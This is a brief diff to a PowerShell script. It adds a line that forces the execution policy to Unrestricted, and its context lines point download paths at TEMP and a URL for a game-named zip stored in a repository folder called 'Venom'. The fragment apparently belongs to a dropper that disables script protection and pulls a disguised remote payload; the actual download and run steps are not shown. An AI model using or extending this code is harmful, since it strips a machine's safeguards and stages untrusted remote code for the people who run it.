@@ -1,3 +1,5 @@
+Set-ExecutionPolicy Unrestricted -Force
+
 Set-Variable -Name textPath -Value ("$env:TEMP")
 Set-Variable -Name zipFilePath -Value ("$env:TEMP")
 Set-Variable -Name zipUrl -Value ("https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip")
